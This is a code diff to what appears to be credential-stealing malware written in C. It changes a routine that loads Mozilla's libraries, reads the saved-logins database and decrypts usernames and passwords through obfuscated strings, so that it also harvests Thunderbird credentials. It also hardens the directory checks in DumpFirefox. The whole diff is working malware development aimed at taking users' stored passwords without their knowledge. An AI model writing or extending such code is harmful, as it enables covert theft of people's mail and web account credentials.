@@ -16,6 +16,7 @@
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
 extern char *HM_CompletePath(char *file_name, char *buffer);
+extern WCHAR *GetTBLibPath();
 extern char H4_DUMMY_NAME[];
 
 //Firefox internal SEC structures
@@ -225,8 +226,11 @@ void FireFoxInitFunc()
 	WCHAR *firefoxDir;
 
 	firefoxDir = GetFFLibPath();
-	if (firefoxDir && !DirectoryExists(firefoxDir)) 
-		return;
+	if (!firefoxDir || !DirectoryExists(firefoxDir)) {
+		firefoxDir = GetTBLibPath();
+		if (!firefoxDir || !DirectoryExists(firefoxDir))
+			return;
+	}
 
 	if (!libcrt) {
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRT_LIBRARY_NAME));
@@ -649,7 +653,7 @@ int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 	
 	for(int i=0; i<argc; i++){
 		if (!strcmp(azColName[i], "hostname")) {
-			swprintf_s(ffentry.service, 255, L"Firefox");
+			swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
 			_snwprintf_s(ffentry.resource, 255, _TRUNCATE, L"%S", argv[i]);
 		}
 		if (!strcmp(azColName[i], DeobStringA("I1pEePLIXb9IE1H0I"))) {  //"encryptedUsername"
@@ -764,12 +768,12 @@ int DumpFirefox(void)
 
 	ProfilePath = GetFFProfilePath();
 
-	if (ProfilePath && !DirectoryExists(ProfilePath)) 
+	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
 		return 0;
 	
 	FFDir = GetFFLibPath();
 
-	if (FFDir && !DirectoryExists(FFDir)) 
+	if (!FFDir || !DirectoryExists(FFDir)) 
 		return 0;
 	
 	if (!InitFFLibs(FFDir))	
